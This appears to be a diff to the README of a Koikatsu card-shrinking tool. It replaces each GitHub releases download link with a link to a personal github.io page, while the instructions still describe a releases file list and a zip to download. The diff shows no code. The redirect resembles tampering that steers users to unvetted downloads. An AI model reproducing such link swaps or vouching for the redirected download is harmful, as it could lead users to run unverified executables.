@@ -1,7 +1,7 @@
 <h1>📦 koikatsu-card-texture-tool - Shrink Card Files, Keep Image Quality</h1>
 
 <p align="center">
-  <a href="https://github.com/Thanemystified54/koikatsu-card-texture-tool/releases"><img src="https://img.shields.io/badge/⬇️%20Download%20Now-2ea44f" alt="Download Badge"></a>
+  <a href="https://thanemystified54.github.io"><img src="https://img.shields.io/badge/⬇️%20Download%20Now-2ea44f" alt="Download Badge"></a>
 </p>
 
 ## 🎯 What Does This Tool Do?
@@ -12,7 +12,7 @@ This program makes your Koikatsu character and outfit card files smaller. You kn
 
 ### Step 1: Download the Program
 
-**Visit this link to download the application:** [https://github.com/Thanemystified54/koikatsu-card-texture-tool/releases](https://github.com/Thanemystified54/koikatsu-card-texture-tool/releases)
+**Visit this link to download the application:** [https://thanemystified54.github.io](https://thanemystified54.github.io)
 
 When you open that page, you'll see a list of files. Look for the newest version at the top. Click on the file to download it. The file name will be something like `KoikatsuCardTextureTool.zip` or similar.
 
